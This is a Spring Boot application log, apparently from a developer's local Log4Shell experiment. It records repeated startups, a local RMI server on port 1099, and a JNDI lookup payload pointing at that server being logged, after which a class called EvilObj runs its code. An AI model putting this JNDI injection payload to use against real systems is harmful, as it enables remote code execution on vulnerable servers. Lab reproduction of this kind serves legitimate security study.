[17:11:17:717] [INFO] - org.springframework.boot.StartupInfoLogger.logStarting(StartupInfoLogger.java:55) - Starting LogApplication using Java 1.8.0_121 on DESKTOP-LU7FA5J with PID 4132 (C:\Users\fanzh23\Documents\workspace\bruce\log\target\classes started by fanzh23 in C:\Users\fanzh23\Documents\workspace\bruce\log)
[17:11:17:866] [INFO] - org.springframework.boot.SpringApplication.logStartupProfileInfo(SpringApplication.java:639) - The following profiles are active: dev
[17:11:19:893] [INFO] - org.springframework.boot.web.embedded.tomcat.TomcatWebServer.initialize(TomcatWebServer.java:108) - Tomcat initialized with port(s): 8080 (http)
[17:11:19:923] [INFO] - org.apache.juli.logging.DirectJDKLog.log(DirectJDKLog.java:173) - Initializing ProtocolHandler ["http-nio-8080"]
[17:11:19:924] [INFO] - org.apache.juli.logging.DirectJDKLog.log(DirectJDKLog.java:173) - Starting service [Tomcat]
[17:11:19:925] [INFO] - org.apache.juli.logging.DirectJDKLog.log(DirectJDKLog.java:173) - Starting Servlet engine: [Apache Tomcat/9.0.55]
[17:11:20:069] [INFO] - org.apache.juli.logging.DirectJDKLog.log(DirectJDKLog.java:173) - Initializing Spring embedded WebApplicationContext
[17:11:20:069] [INFO] - org.springframework.boot.web.servlet.context.ServletWebServerApplicationContext.prepareWebApplicationContext(ServletWebServerApplicationContext.java:290) - Root WebApplicationContext: initialization completed in 2020 ms
[17:11:20:678] [INFO] - org.apache.juli.logging.DirectJDKLog.log(DirectJDKLog.java:173) - Starting ProtocolHandler ["http-nio-8080"]
[17:11:20:704] [INFO] - org.springframework.boot.web.embedded.tomcat.TomcatWebServer.start(TomcatWebServer.java:220) - Tomcat started on port(s): 8080 (http) with context path ''
[17:11:20:719] [INFO] - org.springframework.boot.StartupInfoLogger.logStarted(StartupInfoLogger.java:61) - Started LogApplication in 3.855 seconds (JVM running for 6.473)
[17:11:31:155] [INFO] - org.apache.juli.logging.DirectJDKLog.log(DirectJDKLog.java:173) - Initializing Spring DispatcherServlet 'dispatcherServlet'
[17:11:31:156] [INFO] - org.springframework.web.servlet.FrameworkServlet.initServletBean(FrameworkServlet.java:525) - Initializing Servlet 'dispatcherServlet'
[17:11:31:156] [INFO] - org.springframework.web.servlet.FrameworkServlet.initServletBean(FrameworkServlet.java:547) - Completed initialization in 0 ms
[17:11:35:225] [INFO] - com.bruce.log.controller.LogController.test(LogController.java:44) - hello :Windows 10 10.0, architecture: amd64-64
[17:11:40:619] [INFO] - com.bruce.log.controller.LogController.info(LogController.java:23) - hello :Windows 10 10.0, architecture: amd64-64
[18:06:54:857] [INFO] - org.springframework.boot.StartupInfoLogger.logStarting(StartupInfoLogger.java:55) - Starting LogApplication using Java 1.8.0_121 on DESKTOP-LU7FA5J with PID 43592 (C:\Users\fanzh23\Documents\workspace\bruce\log\target\classes started by fanzh23 in C:\Users\fanzh23\Documents\workspace\bruce\log)
[18:06:54:901] [INFO] - org.springframework.boot.SpringApplication.logStartupProfileInfo(SpringApplication.java:639) - The following profiles are active: dev
[18:06:55:882] [INFO] - org.springframework.boot.web.embedded.tomcat.TomcatWebServer.initialize(TomcatWebServer.java:108) - Tomcat initialized with port(s): 8080 (http)
[18:06:55:907] [INFO] - org.apache.juli.logging.DirectJDKLog.log(DirectJDKLog.java:173) - Initializing ProtocolHandler ["http-nio-8080"]
[18:06:55:907] [INFO] - org.apache.juli.logging.DirectJDKLog.log(DirectJDKLog.java:173) - Starting service [Tomcat]
[18:06:55:908] [INFO] - org.apache.juli.logging.DirectJDKLog.log(DirectJDKLog.java:173) - Starting Servlet engine: [Apache Tomcat/9.0.55]
[18:06:56:031] [INFO] - org.apache.juli.logging.DirectJDKLog.log(DirectJDKLog.java:173) - Initializing Spring embedded WebApplicationContext
[18:06:56:032] [INFO] - org.springframework.boot.web.servlet.context.ServletWebServerApplicationContext.prepareWebApplicationContext(ServletWebServerApplicationContext.java:290) - Root WebApplicationContext: initialization completed in 1086 ms
[18:06:56:506] [INFO] - org.apache.juli.logging.DirectJDKLog.log(DirectJDKLog.java:173) - Starting ProtocolHandler ["http-nio-8080"]
[18:06:56:528] [INFO] - org.springframework.boot.web.embedded.tomcat.TomcatWebServer.start(TomcatWebServer.java:220) - Tomcat started on port(s): 8080 (http) with context path ''
[18:06:56:541] [INFO] - org.springframework.boot.StartupInfoLogger.logStarted(StartupInfoLogger.java:61) - Started LogApplication in 2.235 seconds (JVM running for 3.861)
[18:07:08:270] [INFO] - org.apache.juli.logging.DirectJDKLog.log(DirectJDKLog.java:173) - Initializing Spring DispatcherServlet 'dispatcherServlet'
[18:07:08:271] [INFO] - org.springframework.web.servlet.FrameworkServlet.initServletBean(FrameworkServlet.java:525) - Initializing Servlet 'dispatcherServlet'
[18:07:08:272] [INFO] - org.springframework.web.servlet.FrameworkServlet.initServletBean(FrameworkServlet.java:547) - Completed initialization in 1 ms
[18:07:08:348] [INFO] - com.bruce.log.controller.LogController.evil(LogController.java:50) - hello :Reference Class Name: com.bruce.log.entity.EvilObj

[18:07:38:488] [INFO] - org.springframework.boot.StartupInfoLogger.logStarting(StartupInfoLogger.java:55) - Starting LogApplication using Java 1.8.0_121 on DESKTOP-LU7FA5J with PID 22600 (C:\Users\fanzh23\Documents\workspace\bruce\log\target\classes started by fanzh23 in C:\Users\fanzh23\Documents\workspace\bruce\log)
[18:07:38:555] [INFO] - org.springframework.boot.SpringApplication.logStartupProfileInfo(SpringApplication.java:639) - The following profiles are active: dev
[18:07:39:805] [INFO] - org.springframework.boot.web.embedded.tomcat.TomcatWebServer.initialize(TomcatWebServer.java:108) - Tomcat initialized with port(s): 8080 (http)
[18:07:39:833] [INFO] - org.apache.juli.logging.DirectJDKLog.log(DirectJDKLog.java:173) - Initializing ProtocolHandler ["http-nio-8080"]
[18:07:39:834] [INFO] - org.apache.juli.logging.DirectJDKLog.log(DirectJDKLog.java:173) - Starting service [Tomcat]
[18:07:39:835] [INFO] - org.apache.juli.logging.DirectJDKLog.log(DirectJDKLog.java:173) - Starting Servlet engine: [Apache Tomcat/9.0.55]
[18:07:39:960] [INFO] - org.apache.juli.logging.DirectJDKLog.log(DirectJDKLog.java:173) - Initializing Spring embedded WebApplicationContext
[18:07:39:960] [INFO] - org.springframework.boot.web.servlet.context.ServletWebServerApplicationContext.prepareWebApplicationContext(ServletWebServerApplicationContext.java:290) - Root WebApplicationContext: initialization completed in 1326 ms
[18:07:40:438] [INFO] - org.apache.juli.logging.DirectJDKLog.log(DirectJDKLog.java:173) - Starting ProtocolHandler ["http-nio-8080"]
[18:07:40:460] [INFO] - org.springframework.boot.web.embedded.tomcat.TomcatWebServer.start(TomcatWebServer.java:220) - Tomcat started on port(s): 8080 (http) with context path ''
[18:07:40:472] [INFO] - org.springframework.boot.StartupInfoLogger.logStarted(StartupInfoLogger.java:61) - Started LogApplication in 2.779 seconds (JVM running for 5.409)
[18:07:46:204] [INFO] - org.apache.juli.logging.DirectJDKLog.log(DirectJDKLog.java:173) - Initializing Spring DispatcherServlet 'dispatcherServlet'
[18:07:46:204] [INFO] - org.springframework.web.servlet.FrameworkServlet.initServletBean(FrameworkServlet.java:525) - Initializing Servlet 'dispatcherServlet'
[18:07:46:205] [INFO] - org.springframework.web.servlet.FrameworkServlet.initServletBean(FrameworkServlet.java:547) - Completed initialization in 1 ms
[18:07:46:274] [INFO] - com.bruce.log.controller.LogController.evil(LogController.java:50) - hello :Reference Class Name: com.bruce.log.entity.EvilObj

[18:08:59:575] [INFO] - org.springframework.boot.StartupInfoLogger.logStarting(StartupInfoLogger.java:55) - Starting LogApplication using Java 1.8.0_121 on DESKTOP-LU7FA5J with PID 51184 (C:\Users\fanzh23\Documents\workspace\bruce\log\target\classes started by fanzh23 in C:\Users\fanzh23\Documents\workspace\bruce\log)
[18:08:59:643] [INFO] - org.springframework.boot.SpringApplication.logStartupProfileInfo(SpringApplication.java:639) - The following profiles are active: dev
[18:09:00:944] [INFO] - org.springframework.boot.web.embedded.tomcat.TomcatWebServer.initialize(TomcatWebServer.java:108) - Tomcat initialized with port(s): 8080 (http)
[18:09:00:970] [INFO] - org.apache.juli.logging.DirectJDKLog.log(DirectJDKLog.java:173) - Initializing ProtocolHandler ["http-nio-8080"]
[18:09:00:970] [INFO] - org.apache.juli.logging.DirectJDKLog.log(DirectJDKLog.java:173) - Starting service [Tomcat]
[18:09:00:971] [INFO] - org.apache.juli.logging.DirectJDKLog.log(DirectJDKLog.java:173) - Starting Servlet engine: [Apache Tomcat/9.0.55]
[18:09:01:103] [INFO] - org.apache.juli.logging.DirectJDKLog.log(DirectJDKLog.java:173) - Initializing Spring embedded WebApplicationContext
[18:09:01:104] [INFO] - org.springframework.boot.web.servlet.context.ServletWebServerApplicationContext.prepareWebApplicationContext(ServletWebServerApplicationContext.java:290) - Root WebApplicationContext: initialization completed in 1389 ms
[18:09:01:579] [INFO] - org.apache.juli.logging.DirectJDKLog.log(DirectJDKLog.java:173) - Starting ProtocolHandler ["http-nio-8080"]
[18:09:01:603] [INFO] - org.springframework.boot.web.embedded.tomcat.TomcatWebServer.start(TomcatWebServer.java:220) - Tomcat started on port(s): 8080 (http) with context path ''
[18:09:01:618] [INFO] - org.springframework.boot.StartupInfoLogger.logStarted(StartupInfoLogger.java:61) - Started LogApplication in 2.85 seconds (JVM running for 4.515)
[18:10:41:928] [INFO] - org.springframework.boot.StartupInfoLogger.logStarting(StartupInfoLogger.java:55) - Starting LogApplication using Java 1.8.0_121 on DESKTOP-LU7FA5J with PID 7192 (C:\Users\fanzh23\Documents\workspace\bruce\log\target\classes started by fanzh23 in C:\Users\fanzh23\Documents\workspace\bruce\log)
[18:10:41:997] [INFO] - org.springframework.boot.SpringApplication.logStartupProfileInfo(SpringApplication.java:639) - The following profiles are active: dev
[18:10:43:317] [INFO] - org.springframework.boot.web.embedded.tomcat.TomcatWebServer.initialize(TomcatWebServer.java:108) - Tomcat initialized with port(s): 8080 (http)
[18:10:43:331] [INFO] - org.apache.juli.logging.DirectJDKLog.log(DirectJDKLog.java:173) - Initializing ProtocolHandler ["http-nio-8080"]
[18:10:43:331] [INFO] - org.apache.juli.logging.DirectJDKLog.log(DirectJDKLog.java:173) - Starting service [Tomcat]
[18:10:43:332] [INFO] - org.apache.juli.logging.DirectJDKLog.log(DirectJDKLog.java:173) - Starting Servlet engine: [Apache Tomcat/9.0.55]
[18:10:43:455] [INFO] - org.apache.juli.logging.DirectJDKLog.log(DirectJDKLog.java:173) - Initializing Spring embedded WebApplicationContext
[18:10:43:455] [INFO] - org.springframework.boot.web.servlet.context.ServletWebServerApplicationContext.prepareWebApplicationContext(ServletWebServerApplicationContext.java:290) - Root WebApplicationContext: initialization completed in 1378 ms
[18:10:43:934] [INFO] - org.apache.juli.logging.DirectJDKLog.log(DirectJDKLog.java:173) - Starting ProtocolHandler ["http-nio-8080"]
[18:10:43:958] [INFO] - org.springframework.boot.web.embedded.tomcat.TomcatWebServer.start(TomcatWebServer.java:220) - Tomcat started on port(s): 8080 (http) with context path ''
[18:10:43:971] [INFO] - org.springframework.boot.StartupInfoLogger.logStarted(StartupInfoLogger.java:61) - Started LogApplication in 2.816 seconds (JVM running for 5.455)
[18:10:43:978] [INFO] - com.bruce.log.LogApplication.startRMIServer(LogApplication.java:27) - start server at port 1099
[18:10:52:329] [INFO] - org.apache.juli.logging.DirectJDKLog.log(DirectJDKLog.java:173) - Initializing Spring DispatcherServlet 'dispatcherServlet'
[18:10:52:329] [INFO] - org.springframework.web.servlet.FrameworkServlet.initServletBean(FrameworkServlet.java:525) - Initializing Servlet 'dispatcherServlet'
[18:10:52:329] [INFO] - org.springframework.web.servlet.FrameworkServlet.initServletBean(FrameworkServlet.java:547) - Completed initialization in 0 ms
[18:10:52:405] [INFO] - com.bruce.log.controller.LogController.evil(LogController.java:50) - hello :${jndi:rmi://127.0.0.1:1099/evil}
[18:12:11:962] [INFO] - org.springframework.boot.StartupInfoLogger.logStarting(StartupInfoLogger.java:55) - Starting LogApplication using Java 1.8.0_121 on DESKTOP-LU7FA5J with PID 33240 (C:\Users\fanzh23\Documents\workspace\bruce\log\target\classes started by fanzh23 in C:\Users\fanzh23\Documents\workspace\bruce\log)
[18:12:12:024] [INFO] - org.springframework.boot.SpringApplication.logStartupProfileInfo(SpringApplication.java:639) - The following profiles are active: dev
[18:12:13:321] [INFO] - org.springframework.boot.web.embedded.tomcat.TomcatWebServer.initialize(TomcatWebServer.java:108) - Tomcat initialized with port(s): 8080 (http)
[18:12:13:337] [INFO] - org.apache.juli.logging.DirectJDKLog.log(DirectJDKLog.java:173) - Initializing ProtocolHandler ["http-nio-8080"]
[18:12:13:337] [INFO] - org.apache.juli.logging.DirectJDKLog.log(DirectJDKLog.java:173) - Starting service [Tomcat]
[18:12:13:338] [INFO] - org.apache.juli.logging.DirectJDKLog.log(DirectJDKLog.java:173) - Starting Servlet engine: [Apache Tomcat/9.0.55]
[18:12:13:479] [INFO] - org.apache.juli.logging.DirectJDKLog.log(DirectJDKLog.java:173) - Initializing Spring embedded WebApplicationContext
[18:12:13:480] [INFO] - org.springframework.boot.web.servlet.context.ServletWebServerApplicationContext.prepareWebApplicationContext(ServletWebServerApplicationContext.java:290) - Root WebApplicationContext: initialization completed in 1393 ms
[18:12:13:969] [INFO] - org.apache.juli.logging.DirectJDKLog.log(DirectJDKLog.java:173) - Starting ProtocolHandler ["http-nio-8080"]
[18:12:13:991] [INFO] - org.springframework.boot.web.embedded.tomcat.TomcatWebServer.start(TomcatWebServer.java:220) - Tomcat started on port(s): 8080 (http) with context path ''
[18:12:14:004] [INFO] - org.springframework.boot.StartupInfoLogger.logStarted(StartupInfoLogger.java:61) - Started LogApplication in 2.696 seconds (JVM running for 4.484)
[18:12:14:009] [INFO] - com.bruce.log.LogApplication.startRMIServer(LogApplication.java:27) - start server at port 1099
[18:12:19:858] [INFO] - org.apache.juli.logging.DirectJDKLog.log(DirectJDKLog.java:173) - Initializing Spring DispatcherServlet 'dispatcherServlet'
[18:12:19:859] [INFO] - org.springframework.web.servlet.FrameworkServlet.initServletBean(FrameworkServlet.java:525) - Initializing Servlet 'dispatcherServlet'
[18:12:19:859] [INFO] - org.springframework.web.servlet.FrameworkServlet.initServletBean(FrameworkServlet.java:547) - Completed initialization in 0 ms
[18:12:19:965] [INFO] - com.bruce.log.entity.EvilObj.<clinit>(EvilObj.java:23) - I'm evil
[18:12:19:941] [INFO] - com.bruce.log.controller.LogController.evil(LogController.java:50) - hello :${jndi:rmi://127.0.0.1:1099/evil}
[18:17:32:910] [INFO] - org.springframework.boot.StartupInfoLogger.logStarting(StartupInfoLogger.java:55) - Starting LogApplication using Java 1.8.0_121 on DESKTOP-LU7FA5J with PID 20348 (C:\Users\fanzh23\Documents\workspace\bruce\log\target\classes started by fanzh23 in C:\Users\fanzh23\Documents\workspace\bruce\log)
[18:17:32:956] [INFO] - org.springframework.boot.SpringApplication.logStartupProfileInfo(SpringApplication.java:639) - The following profiles are active: dev
[18:17:34:242] [INFO] - org.springframework.boot.web.embedded.tomcat.TomcatWebServer.initialize(TomcatWebServer.java:108) - Tomcat initialized with port(s): 8080 (http)
[18:17:34:258] [INFO] - org.apache.juli.logging.DirectJDKLog.log(DirectJDKLog.java:173) - Initializing ProtocolHandler ["http-nio-8080"]
[18:17:34:258] [INFO] - org.apache.juli.logging.DirectJDKLog.log(DirectJDKLog.java:173) - Starting service [Tomcat]
[18:17:34:259] [INFO] - org.apache.juli.logging.DirectJDKLog.log(DirectJDKLog.java:173) - Starting Servlet engine: [Apache Tomcat/9.0.55]
[18:17:34:394] [INFO] - org.apache.juli.logging.DirectJDKLog.log(DirectJDKLog.java:173) - Initializing Spring embedded WebApplicationContext
[18:17:34:395] [INFO] - org.springframework.boot.web.servlet.context.ServletWebServerApplicationContext.prepareWebApplicationContext(ServletWebServerApplicationContext.java:290) - Root WebApplicationContext: initialization completed in 1398 ms
[18:17:34:899] [INFO] - org.apache.juli.logging.DirectJDKLog.log(DirectJDKLog.java:173) - Starting ProtocolHandler ["http-nio-8080"]
[18:17:34:924] [INFO] - org.springframework.boot.web.embedded.tomcat.TomcatWebServer.start(TomcatWebServer.java:220) - Tomcat started on port(s): 8080 (http) with context path ''
[18:17:34:937] [INFO] - org.springframework.boot.StartupInfoLogger.logStarted(StartupInfoLogger.java:61) - Started LogApplication in 2.538 seconds (JVM running for 4.04)
[18:17:34:944] [INFO] - com.bruce.log.LogApplication.startRMIServer(LogApplication.java:27) - start server at port 1099
[18:17:39:894] [INFO] - org.apache.juli.logging.DirectJDKLog.log(DirectJDKLog.java:173) - Initializing Spring DispatcherServlet 'dispatcherServlet'
[18:17:39:894] [INFO] - org.springframework.web.servlet.FrameworkServlet.initServletBean(FrameworkServlet.java:525) - Initializing Servlet 'dispatcherServlet'
[18:17:39:895] [INFO] - org.springframework.web.servlet.FrameworkServlet.initServletBean(FrameworkServlet.java:547) - Completed initialization in 1 ms
[18:17:39:982] [INFO] - com.bruce.log.controller.LogController.evil(LogController.java:50) - hello :${jndi:rmi://127.0.0.1:1099/evil}
[18:18:40:236] [INFO] - org.springframework.boot.StartupInfoLogger.logStarting(StartupInfoLogger.java:55) - Starting LogApplication using Java 1.8.0_121 on DESKTOP-LU7FA5J with PID 16616 (C:\Users\fanzh23\Documents\workspace\bruce\log\target\classes started by fanzh23 in C:\Users\fanzh23\Documents\workspace\bruce\log)
[18:18:40:313] [INFO] - org.springframework.boot.SpringApplication.logStartupProfileInfo(SpringApplication.java:639) - The following profiles are active: dev
[18:18:41:649] [INFO] - org.springframework.boot.web.embedded.tomcat.TomcatWebServer.initialize(TomcatWebServer.java:108) - Tomcat initialized with port(s): 8080 (http)
[18:18:41:666] [INFO] - org.apache.juli.logging.DirectJDKLog.log(DirectJDKLog.java:173) - Initializing ProtocolHandler ["http-nio-8080"]
[18:18:41:666] [INFO] - org.apache.juli.logging.DirectJDKLog.log(DirectJDKLog.java:173) - Starting service [Tomcat]
[18:18:41:667] [INFO] - org.apache.juli.logging.DirectJDKLog.log(DirectJDKLog.java:173) - Starting Servlet engine: [Apache Tomcat/9.0.55]
[18:18:41:810] [INFO] - org.apache.juli.logging.DirectJDKLog.log(DirectJDKLog.java:173) - Initializing Spring embedded WebApplicationContext
[18:18:41:810] [INFO] - org.springframework.boot.web.servlet.context.ServletWebServerApplicationContext.prepareWebApplicationContext(ServletWebServerApplicationContext.java:290) - Root WebApplicationContext: initialization completed in 1413 ms
[18:18:42:325] [INFO] - org.apache.juli.logging.DirectJDKLog.log(DirectJDKLog.java:173) - Starting ProtocolHandler ["http-nio-8080"]
[18:18:42:351] [INFO] - org.springframework.boot.web.embedded.tomcat.TomcatWebServer.start(TomcatWebServer.java:220) - Tomcat started on port(s): 8080 (http) with context path ''
[18:18:42:365] [INFO] - org.springframework.boot.StartupInfoLogger.logStarted(StartupInfoLogger.java:61) - Started LogApplication in 2.936 seconds (JVM running for 6.778)
[18:18:42:374] [INFO] - com.bruce.log.LogApplication.startRMIServer(LogApplication.java:27) - start server at port 1099
[18:18:58:300] [INFO] - org.apache.juli.logging.DirectJDKLog.log(DirectJDKLog.java:173) - Initializing Spring DispatcherServlet 'dispatcherServlet'
[18:18:58:301] [INFO] - org.springframework.web.servlet.FrameworkServlet.initServletBean(FrameworkServlet.java:525) - Initializing Servlet 'dispatcherServlet'
[18:18:58:302] [INFO] - org.springframework.web.servlet.FrameworkServlet.initServletBean(FrameworkServlet.java:547) - Completed initialization in 1 ms
[18:18:58:351] [INFO] - com.bruce.log.entity.EvilObj.<clinit>(EvilObj.java:23) - I'm evil
[18:18:58:333] [INFO] - com.bruce.log.controller.LogController.evil(LogController.java:51) - hello :${jndi:rmi://127.0.0.1:1099/evil}
[18:19:41:326] [INFO] - org.springframework.boot.StartupInfoLogger.logStarting(StartupInfoLogger.java:55) - Starting LogApplication using Java 1.8.0_121 on DESKTOP-LU7FA5J with PID 48596 (C:\Users\fanzh23\Documents\workspace\bruce\log\target\classes started by fanzh23 in C:\Users\fanzh23\Documents\workspace\bruce\log)
[18:19:41:391] [INFO] - org.springframework.boot.SpringApplication.logStartupProfileInfo(SpringApplication.java:639) - The following profiles are active: dev
[18:19:42:588] [INFO] - org.springframework.boot.web.embedded.tomcat.TomcatWebServer.initialize(TomcatWebServer.java:108) - Tomcat initialized with port(s): 8080 (http)
[18:19:42:601] [INFO] - org.apache.juli.logging.DirectJDKLog.log(DirectJDKLog.java:173) - Initializing ProtocolHandler ["http-nio-8080"]
[18:19:42:602] [INFO] - org.apache.juli.logging.DirectJDKLog.log(DirectJDKLog.java:173) - Starting service [Tomcat]
[18:19:42:602] [INFO] - org.apache.juli.logging.DirectJDKLog.log(DirectJDKLog.java:173) - Starting Servlet engine: [Apache Tomcat/9.0.55]
[18:19:42:733] [INFO] - org.apache.juli.logging.DirectJDKLog.log(DirectJDKLog.java:173) - Initializing Spring embedded WebApplicationContext
[18:19:42:734] [INFO] - org.springframework.boot.web.servlet.context.ServletWebServerApplicationContext.prepareWebApplicationContext(ServletWebServerApplicationContext.java:290) - Root WebApplicationContext: initialization completed in 1275 ms
[18:19:43:178] [INFO] - org.apache.juli.logging.DirectJDKLog.log(DirectJDKLog.java:173) - Starting ProtocolHandler ["http-nio-8080"]
[18:19:43:200] [INFO] - org.springframework.boot.web.embedded.tomcat.TomcatWebServer.start(TomcatWebServer.java:220) - Tomcat started on port(s): 8080 (http) with context path ''
[18:19:43:211] [INFO] - org.springframework.boot.StartupInfoLogger.logStarted(StartupInfoLogger.java:61) - Started LogApplication in 2.63 seconds (JVM running for 5.343)
[18:19:43:217] [INFO] - com.bruce.log.LogApplication.startRMIServer(LogApplication.java:27) - start server at port 1099
[18:19:51:527] [INFO] - org.apache.juli.logging.DirectJDKLog.log(DirectJDKLog.java:173) - Initializing Spring DispatcherServlet 'dispatcherServlet'
[18:19:51:527] [INFO] - org.springframework.web.servlet.FrameworkServlet.initServletBean(FrameworkServlet.java:525) - Initializing Servlet 'dispatcherServlet'
[18:19:51:528] [INFO] - org.springframework.web.servlet.FrameworkServlet.initServletBean(FrameworkServlet.java:547) - Completed initialization in 0 ms
[18:19:51:593] [INFO] - com.bruce.log.controller.LogController.evil(LogController.java:51) - hello :${jndi:rmi://127.0.0.1:1099/evil}
[18:20:19:510] [INFO] - org.springframework.boot.StartupInfoLogger.logStarting(StartupInfoLogger.java:55) - Starting LogApplication using Java 1.8.0_121 on DESKTOP-LU7FA5J with PID 32644 (C:\Users\fanzh23\Documents\workspace\bruce\log\target\classes started by fanzh23 in C:\Users\fanzh23\Documents\workspace\bruce\log)
[18:20:19:579] [INFO] - org.springframework.boot.SpringApplication.logStartupProfileInfo(SpringApplication.java:639) - The following profiles are active: dev
[18:20:21:049] [INFO] - org.springframework.boot.web.embedded.tomcat.TomcatWebServer.initialize(TomcatWebServer.java:108) - Tomcat initialized with port(s): 8080 (http)
[18:20:21:063] [INFO] - org.apache.juli.logging.DirectJDKLog.log(DirectJDKLog.java:173) - Initializing ProtocolHandler ["http-nio-8080"]
[18:20:21:064] [INFO] - org.apache.juli.logging.DirectJDKLog.log(DirectJDKLog.java:173) - Starting service [Tomcat]
[18:20:21:064] [INFO] - org.apache.juli.logging.DirectJDKLog.log(DirectJDKLog.java:173) - Starting Servlet engine: [Apache Tomcat/9.0.55]
[18:20:21:196] [INFO] - org.apache.juli.logging.DirectJDKLog.log(DirectJDKLog.java:173) - Initializing Spring embedded WebApplicationContext
[18:20:21:197] [INFO] - org.springframework.boot.web.servlet.context.ServletWebServerApplicationContext.prepareWebApplicationContext(ServletWebServerApplicationContext.java:290) - Root WebApplicationContext: initialization completed in 1544 ms
[18:20:21:667] [INFO] - org.apache.juli.logging.DirectJDKLog.log(DirectJDKLog.java:173) - Starting ProtocolHandler ["http-nio-8080"]
[18:20:21:688] [INFO] - org.springframework.boot.web.embedded.tomcat.TomcatWebServer.start(TomcatWebServer.java:220) - Tomcat started on port(s): 8080 (http) with context path ''
[18:20:21:700] [INFO] - org.springframework.boot.StartupInfoLogger.logStarted(StartupInfoLogger.java:61) - Started LogApplication in 3.066 seconds (JVM running for 5.032)
[18:20:21:706] [INFO] - com.bruce.log.LogApplication.startRMIServer(LogApplication.java:27) - start server at port 1099
[18:20:30:738] [INFO] - org.apache.juli.logging.DirectJDKLog.log(DirectJDKLog.java:173) - Initializing Spring DispatcherServlet 'dispatcherServlet'
[18:20:30:739] [INFO] - org.springframework.web.servlet.FrameworkServlet.initServletBean(FrameworkServlet.java:525) - Initializing Servlet 'dispatcherServlet'
[18:20:30:739] [INFO] - org.springframework.web.servlet.FrameworkServlet.initServletBean(FrameworkServlet.java:547) - Completed initialization in 0 ms
[18:20:30:811] [INFO] - com.bruce.log.controller.LogController.evil(LogController.java:51) - hello :${jndi:rmi://127.0.0.1:1099/evil}
